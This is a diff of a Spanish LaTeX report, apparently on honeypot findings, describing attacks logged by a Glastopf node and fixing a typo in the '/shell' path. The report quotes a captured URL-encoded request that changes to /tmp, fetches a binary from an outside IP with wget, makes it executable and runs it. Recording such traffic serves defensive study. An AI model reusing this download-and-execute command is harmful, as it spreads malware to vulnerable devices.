@@ -570,7 +570,7 @@ Otra información útil puede ser ver qué clientes ssh han sido los más utiliz
 \section{Resultados obtenidos en el nodo Glastopf}
 Centrándonos ahora en Glastopf, hemos recibido numerosos ataques del tipo inyección SQL, así como búsqueda de los ficheros \textit{robots.txt} o \textit{sitemap.xml}, ambos de ellos conocidos por contener información valiosa sobre la estructura de un sitio web. Además hemos encontrado varias pruebas hacia la ruta \textit{/wp-login.php}, debido a que el atacante ha debido creer que tenemos un \textit{wordpress} funcionando en el servidor y ha tratado de localizar el login.
 \\\\
-En otro ataque muy común, el atacante trata de acceder a la carpeta \textit{/shel}l, la cual no existe, lo que nos hace suponer que los ataques dirigidos al nodo Glastopf también son automatizados. El atacante escribe en dicha ubicación una cadena muy larga de caracteres, por ejemplo una como la siguiente (la más común):
+En otro ataque muy común, el atacante trata de acceder a la carpeta \textit{/shell}, la cual no existe, lo que nos hace suponer que los ataques dirigidos al nodo Glastopf también son automatizados. El atacante escribe en dicha ubicación una cadena muy larga de caracteres, por ejemplo una como la siguiente (la más común):
 \lstset{breaklines=true, alsoletter={\%}}
 \begin{lstlisting}
 /shell? %63 %64 %20 %2F %74 %6D %70 %3B %77 %67 %65 %74 %20 %68 %74 %74 %70 %3A %2F %2F %36 %31 %2E %31 %36 %30 %2E %32 %31 %33 %2E %32 %38 %3A %35 %34 %33 %32 %31 %2F %64 %6C %72 %2E %61 %72 %6D %3B %63 %68 %6D %6F %64 %20 %37 %37 %37 %20 %2A %3B %2E %2F %64 %6C %72 %2E %61 %72 %6D
